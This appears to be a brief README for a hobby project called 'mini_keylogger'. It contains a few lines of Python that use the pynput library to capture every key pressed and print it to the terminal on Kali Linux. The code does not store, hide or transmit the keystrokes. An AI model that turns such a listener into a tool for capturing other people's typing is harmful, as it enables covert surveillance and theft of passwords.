# mini_keylogger

it is an mini keylogger which prints all key strokes typed in our terminal(iam using in kali)

iam attaching the python file and code here;)



<code starts here>


import pynput.keyboard


def callback_function(key):
    print(key)

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()
    
    
    <varta mamey;)>
